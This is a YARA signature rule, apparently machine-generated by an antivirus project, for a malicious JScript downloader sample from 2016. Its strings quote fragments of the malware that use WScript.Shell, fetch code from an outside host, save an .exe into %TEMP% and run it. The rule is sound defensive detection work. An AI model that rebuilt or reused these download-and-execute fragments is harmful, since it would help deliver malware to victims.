rule sig_20160330_204bbf694fc7e9ddc2fb17550559e16f {
  meta:
    description = "datamaliciousorder - file 20160330_204bbf694fc7e9ddc2fb17550559e16f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e92dd360fa7bc365d711c3d7dd880c76fee00451f450e05b7f0b0886e25ef73f"

  strings:
    $s1  = "var _RN = function _HC() {return WScript[_MR](\"WScript\"+\".Shell\");}(), _LE = 11;" fullword ascii
    $s2  = "function _MS(_DC, _T1){_PB = _PB * 1; return _DC - _T1;};" fullword ascii
    $s3  = "_M0[_N](\"GET\", \"http://bonares.pl/x9isa\", false);" fullword ascii
    $s4  = "if (_M0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _S() {return _RN[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8PVvoGTq.ex\" + \"e\";};" fullword ascii
    $s6  = "function _V(){return _JN + \"\";};" fullword ascii
    $s7  = "function _MZ() {return ((_EK == true) && (_EK == _D0)) ? 1 : _PB;};" fullword ascii
    $s8  = "function _M(_SH){_RN[\"Run\"](_SH, _PB, _PB);};" fullword ascii
    $s9  = "function _RD(){return _MR;};" fullword ascii
    $s10 = "return _MS(_LH, _C);" fullword ascii
    $s11 = "function _T(_FC) {var _D = (1, 2, 3, 4, 5, _FC); return _D;};" fullword ascii
    $s12 = "var _MY = new this[\"Date\"]();" fullword ascii
    $s13 = "function _Q()" fullword ascii
    $s14 = "function _ZV(){return 22;};" fullword ascii
    $s15 = " while (_X0){" fullword ascii
    $s16 = "var _D0 = false;" fullword ascii
    $s17 = "var _EK = false;" fullword ascii
    $s18 = "_EK = true; " fullword ascii
    $s19 = "_D0 = true; " fullword ascii
    $s20 = "} catch(_T0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}